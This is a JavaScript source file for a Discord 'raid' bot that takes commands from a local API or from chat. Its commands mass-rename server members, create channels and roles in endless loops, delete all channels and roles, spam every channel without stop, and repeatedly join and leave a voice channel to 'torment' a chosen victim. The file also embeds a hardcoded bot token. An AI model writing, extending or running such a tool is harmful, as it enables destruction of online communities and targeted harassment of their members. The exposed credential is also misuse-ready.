process.stdout.write('\x1Bc')

// Variables
const raidDir = '../raidData'
const genDir = '../genData'

import fetch from 'node-fetch'

import { Client, Intents } from 'discord.js'
import { joinVoiceChannel } from '@discordjs/voice'

import dotaShit from '../genData/dotaShit.json' assert {type: 'json'}
import animeShit from '../genData/animeShit.json' assert {type: 'json'}
import shutUp from '../genData/SHUT_UP.json' assert {type: 'json'}

import GUILDS from '../raidData/RAIDED_GUILDS.json' assert {type: 'json'}
import IGNORE_CHANNELS from '../raidData/IGNORE_CHANNELS.json' assert {type: "json"}

import utils from '../utils.js'

const API = 'http://localhost:4000/commands'
const DELAY = 1000

let commandHanlder

function launch(token, delay) {
    const allIntents = new Intents(32767);
    const client = new Client({ intents: allIntents });

    let lastTime = 0

    client.on('ready', () => {
        console.log(`Logged in as ${client.user.tag}!`);

        setInterval(() => {
            fetch(API)
                .then(async (response) => {
                    let data = await response.text()
                    data = JSON.parse(data)

                    let option = data.command
                    let firstWord = option.split(' ')[0]
                    let time = data.time

                    if (lastTime === time) {
                        return
                    }

                    lastTime = time

                    if (!(firstWord in commandHanlder)) {
                        console.warn(`Undefined options: ${firstWord}, type help for more info`)
                        return
                    }

                    command[firstWord](option)
                })
                .catch((err) => {
                    console.warn(err)
                })
        }, DELAY)
    });

    let command = {
        'options': (message) => {
            if (typeof message === 'string') {
                const options = message.split(' ')
                const guild = client.guilds.cache.get(GUILDS[0])


                return { options, guild }
            }
            else {
                const options = message.content.split(' ')
                const channel = client.channels.cache.get(message.channelId)
                const guild = client.guilds.cache.get(message.guildId)

                return { options, guild }
            }
        },
        'help': (message) => {
            //
        },
        'changeNicks': (message) => {
            const base = command.options(message);
            const guildMembers = base.guild.members.cache

            utils.changeAllNicks(guildMembers, delay, animeShit)
        },

        'changeNicksInf': (message) => {
            const base = command.options(message);
            const guildMembers = base.guild.members.cache

            setInterval(() => {
                utils.changeAllNicks(guildMembers, delay, animeShit)
            }, 100)
        },
        'changeNicks1': (message) => {
            const base = command.options(message);
            const guildMembers = base.guild.members.cache
            const nickname = base.options[1]

            utils.changeAllNicks(guildMembers, delay, [nickname])
        },
        'createChannels': (message) => {
            const base = command.options(message);
            const cycles = base.options[1]

            for (let i = 0; i < cycles; i++) {
                setTimeout(() => {
                    base.guild.channels.create(utils.getRandomItem(animeShit), {
                        type: utils.getRandomItem(["GUILD_VOICE", "GUILD_TEXT"]),
                    })
                        .then(channel => { console.log(`Channel ${channel.name} created`) })
                        .catch(error => {
                            // console.warn('Something wrong', '[createChannels]')
                        })
                }, delay)
            }
        },
        'deleteChannels': (message) => {
            const base = command.options(message);

            for (let channel of base.guild.channels.cache) {
                if (IGNORE_CHANNELS.indexOf(channel[1].name) === -1) {
                    channel[1].delete('Because I can').catch(error => {
                        // console.warn('Something wrong', '[deleteChannels]')
                    })
                }
            }
        },
        'createRoles': (message) => {
            const base = command.options(message);
            const cycles = base.options[1]

            for (let i = 0; i < cycles; i++) {
                setTimeout(() => {
                    base.guild.roles.create({
                        name: utils.getRandomItem(dotaShit),
                        color: "RANDOM",
                    })
                        .then(role => {
                            console.log(`Role ${role.name} created`)
                            for (let member of base.guild.members.cache) {
                                member[1].roles.add(role)
                            }
                        })
                        .catch(error => {
                            // console.warn('Something wrong', '[createRoles]')
                        })
                }, delay)
            }

        },
        'deleteRoles': (message) => {
            const base = command.options(message);

            for (let role of base.guild.roles.cache) {
                setTimeout(() => {

                    role[1].delete('Because I can')
                        .then(role => {
                            if (lastCommand !== message) {
                                console.log(`Role ${role.name} deleted`)
                            }
                        })
                        .catch(error => {
                            // console.warn('Something wrong', '[deleteRoles]')
                        })
                }, 200)
            }
        },
        'spam': (message) => {
            const base = command.options(message);
            const channels = base.guild.channels.cache

            utils.spamALlChannels(channels, delay)
        },
        'spamInf': (message) => {
            const base = command.options(message);
            const channels = base.guild.channels.cache

            setInterval(() => {
                utils.spamALlChannels(channels, delay)
            }, 1)
        },
        'tormentWithSound': (message) => {
            const base = command.options(message)
            const victim = base.options[1]

            // const channel = base.guild.channels.cache.get("721854300707487774")
            const channel = client.channels.cache.get("723290894391967848")

            setInterval(() => {
                setTimeout(() => {
                    joinVoiceChannel({
                        channelId: channel.id,
                        guildId: channel.guild.id,
                        adapterCreator: channel.guild.voiceAdapterCreator,
                    })
                }, 500 + delay)

                setTimeout(() => {
                    utils.exitVoiceChannel(channel.guild.id)
                }, 900 + delay)
            }, 1200 + delay)
        }
    }

    client.on('messageCreate', (message) => {
        let firstWord = message.content.split(' ')[0]
        let channel = client.channels.cache.get(message.channelId)

        if (message.author.id === client.user.id || BOTS.indexOf(message.author.id) !== -1) {
            return;
        }

        if (firstWord in command) {
            command[firstWord](message)

            channel.send(`[${firstWord}] successfully executed`);
        }
        else if (message.content.indexOf('^') === -1) {
            channel.send(utils.getRandomItem(shutUp));
        }
    });

    client.login(token);

    return command
}


const delay = 500
const token = 'OTgyMjQ2OTU2MzAwNjMyMTE0.G1JzRW.knoeGiduBNM6oVaJYVL54dbWIYiY4SPrjncIfw'
commandHanlder = launch(token, delay)